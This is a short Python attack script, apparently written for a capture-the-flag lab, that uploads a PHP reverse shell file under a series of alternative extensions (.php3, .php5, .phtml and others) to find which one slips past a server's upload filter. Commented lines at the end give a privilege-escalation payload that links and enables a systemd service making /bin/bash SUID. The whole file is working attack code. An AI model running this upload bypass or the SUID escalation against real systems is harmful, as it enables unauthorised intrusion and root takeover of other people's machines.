#!/usr/bin/env python

import requests
import os

ip = "10.10.237.96"
url = f"http://{ip}:3333/internal/index.php"
old_filename = "revershall.php"
filename = "revershall"
extensions = [
".php",
".php3",
".php4",
".php5",
".phtml",
]

for ext in extensions:
    new_filename = filename + ext
    os.rename(old_filename, new_filename)
    files = {"file": open(new_filename, "rb")}
    r = requests.post(url, files=files)

    if "Extension not allowed" in r.text:
        print(f"{ext} not allowed")
    else:
        print(f"{ext} seems to be allowed ?? ")
    
    old_filename = new_filename
os.system(f"cp {old_filename} revershall.php")
os.system("ls")


# TF=$(mktemp).service
# echo '[Service]
# Type=oneshot
# ExecStart=/bin/sh -c "chmod +s /bin/bash"
# [Install]
# WantedBy=multi-user.target' > $TF
# /bin/systemctl link $TF
# /bin/systemctl enable --now $TF